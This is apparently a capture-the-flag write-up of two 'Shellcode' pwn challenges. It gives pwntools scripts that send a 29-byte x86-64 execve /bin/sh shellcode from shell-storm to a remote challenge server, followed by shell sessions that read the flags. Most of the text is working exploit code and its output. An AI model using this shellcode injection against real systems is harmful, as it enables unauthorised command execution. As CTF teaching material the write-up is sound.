## Shellcode 1 & 2 (pwn)

These challenges had us input shellcode which the programs would execute.

The first Shellcode challenge had a input buffer of 64 bytes. This means that the shellcode could not be longer than 64 bytes.

I have previously done some similar challenges and have used https://shell-storm.org/shellcode/index.html before.

The binary given was x86-64. Therefore I had to use shellcode that fit.

By scrolling down to Linux x86-64 on the shell-storm website I found this:
https://shell-storm.org/shellcode/files/shellcode-905.html

This shellcode was only 29 bytes and well within the 64 bytes buffer.

Then I could craft my exploit:
```python
from pwn import *

p = remote("20.240.63.48", 30011)

p.recvuntil(b"Do you like shellcode? I do. Give me your best shellcode (max 64 bytes) and I'll run it!\n")

shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

p.sendline(shellcode)

p.interactive()
```

This led me to pop a shell and get the flag:
```shell
$ python3 shellexploit.py
[+] Opening connection to 20.240.63.48 on port 30011: Done
[*] Switching to interactive mode
$ ls
flag.txt
shellcode
ynetd
$ cat flag.txt
KCSC{w4ke_up_n3o}
```


Shellcode 2 was really similar, but the buffer was only 32 bytes this time. My shellcode from the previous challenge was 29 bytes, and therefore within the limit. 
The only differences I made was the port number and the string pwntools should wait until, before sending the shellcode.

```python
from pwn import *

p = remote("20.240.63.48", 30012)

p.recvuntil(b"Now write only 32 byte shellcode!\n")

shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

p.sendline(shellcode)

p.interactive()
```

```shell
$ python3 shellexploit.py
[+] Opening connection to 20.240.63.48 on port 30012: Done
[*] Switching to interactive mode
$ ls
flag.txt
shellcode2
ynetd
$ cat flag.txt
KCSC{f0ll0w_t3h_wh1te_rabb1t}
```